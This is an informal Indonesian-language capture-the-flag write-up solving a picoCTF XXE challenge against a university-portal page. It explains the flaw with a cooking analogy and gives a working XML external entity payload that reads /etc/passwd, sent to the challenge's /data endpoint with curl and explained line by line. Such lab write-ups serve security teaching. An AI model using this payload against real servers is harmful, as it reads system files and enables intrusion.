kita diberikan sebuah website portal universitas sederhana dengan tombol details
apa yang kita temukan di source code??

kita menemukan dua script 
dan ada logika yang menarik yaitu

// Data dibungkus menjadi XML
function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';
    xml += '<ID>' + value + '</ID>'; 
    xml += '</data>';
    return xml;
}

dan data dikirim ke server dengan post /data dengan header contenttype application/xml

website ini tidak mengirim data menggunakan json seperti biasanya
melainkan menggunakan format xml karena ada petunjuk terkait external entiry 
jadi kita bisa berasumsi bahwa parser xml di server tidak diamankan

jadi apa itu xxe?
bayangkan server adalah seorang koki dan xml adalah kerta pesanan
normalnya and menulis di kertas pesanan tolong buatkan sebuah nasi goreng id 1
koki membaca id 1 lalu memasak menu nomor 1

celah di xe adalah parser tidak diamankan memungkinkan kita menulis catatan atau referensi khusus dipesanan

serangann yang terjadi adalah kiat memanipulasi kertas pesanan sebselumnya menjadi 

tolong buatkan menu yang namanya tercatat di file rahasia di brankas kantor

sebut saja menu itu &xxe
koki yang polos atau server yang rentang akan eksekusi fil eyang ada

kita tidak bisa melakukan serangan dengan klik tombol di browser 
karena browser sudah diprogram oleh javascript untuk mengirim xml yang bersih
kita harus mencegar atau membuat permintaan atau request dengan cURL

kita buat file bernama payload yang isinya ya payload sederhana

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data>
  <ID>&xxe;</ID>
</data>

lalu kita bisa send serangan ini dengan cURL

curl -X POST -d @payload.xml http://saturn.picoctf.net:61885/

dan kenapa error? dikarenakan kita berada di endpoint yang salah
curl -X POST -d @payload.xml -H "Content-Type: application/xml" http://saturn.picoctf.net:61885/data

dan kita langsung eksekusi dan kita mendapatkan sebuah cat dari etcpasswd

penjelasan terkait payload

<?xml version="1.0" encoding="UTF-8"?>
artinya header pembuka sama seperti <?php

lalu ada jebakan 
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>

Ini adalah bagian terpenting. DOCTYPE (Document Type Definition) biasanya digunakan untuk mendefinisikan aturan dokumen. Tapi di sini, kita menggunakannya untuk membuat Variabel Jahat.
<!DOCTYPE foo [...]>: Kita mendefinisikan sebuah dokumen tipe "foo".
<!ELEMENT foo ANY >: Kita bilang elemen "foo" boleh berisi apa saja (ini hanya formalitas sintaks).
<!ENTITY xxe SYSTEM "file:///etc/passwd" >: INI INTINYA.
ENTITY xxe: Kita membuat variabel (singkatan) bernama xxe.
SYSTEM: Kata kunci ini memerintahkan parser XML server untuk keluar dari dokumen dan mengambil data dari sistem operasinya.
"file:///etc/passwd": Ini adalah alamat tujuannya. Kita menyuruh server mengambil isi file /etc/passwd (file daftar user di Linux).
Kesimpulan Baris Ini: "Hai server, tolong buat variabel bernama xxe. Isi variabel ini adalah teks yang kamu baca dari file /etc/passwd di harddiskmu."

data inject 
<data>
  <ID>&xxe;</ID>
</data>
<data>...: Ini adalah struktur XML yang diharapkan oleh aplikasi (sesuai format asli dari soal).
<ID>&xxe;</ID>: Di sinilah kita memanggil variabel tadi.
Simbol &...; adalah cara memanggil Entity di XML.
Ketika server membaca &xxe;, dia ingat perintah di atas tadi. Dia akan berpikir: "Oh, user minta variabel xxe. Tadi definisinya adalah baca file /etc/passwd. Oke, aku baca filenya sekarang dan tempel hasilnya di sini."
